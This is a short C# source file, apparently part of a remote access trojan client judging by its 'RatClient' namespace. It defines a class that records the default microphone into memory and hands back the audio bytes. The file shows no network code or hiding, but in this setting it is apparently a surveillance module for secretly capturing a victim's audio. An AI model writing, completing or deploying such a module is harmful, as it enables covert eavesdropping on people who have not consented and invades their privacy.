using NAudio.Wave;
using System.IO;
using System.Threading;

namespace RatClient.Mtool
{
    class AudioRecorder
    {
        private WaveInEvent waveSource = null;
        private WaveFileWriter waveFile = null;
        private MemoryStream memoryStream = null;
        private ManualResetEvent recordingStoppedEvent = new ManualResetEvent(false);

        public void StartRecording()
        {
            waveSource = new WaveInEvent();
            waveSource.WaveFormat = new WaveFormat(24000, 8, 2);
            waveSource.DeviceNumber = 0;

            memoryStream = new MemoryStream();
            waveFile = new WaveFileWriter(memoryStream, waveSource.WaveFormat);

            waveSource.DataAvailable += WaveSource_DataAvailable;
            waveSource.RecordingStopped += WaveSource_RecordingStopped;

            waveSource.StartRecording();
        }

        public byte[] StopRecording()
        {
            byte[] res = new byte[0];
            if (waveSource != null)
            {
                waveSource.StopRecording();
                recordingStoppedEvent.WaitOne();
            }
            if (memoryStream != null)
            {
                res = memoryStream.ToArray();
                memoryStream.Dispose();
            }
            return res;
        }


        private void WaveSource_DataAvailable(object sender, WaveInEventArgs e)
        {
            if (waveFile != null)
            {
                waveFile.Write(e.Buffer, 0, e.BytesRecorded);
                waveFile.Flush();
            }
        }

        private void WaveSource_RecordingStopped(object sender, StoppedEventArgs e)
        {
            if (waveSource != null)
            {
                waveSource.Dispose();
                waveSource = null;
            }

            if (waveFile != null)
            {
                waveFile.Dispose();
                waveFile = null;
            }
            recordingStoppedEvent.Set();
        }
    }
}
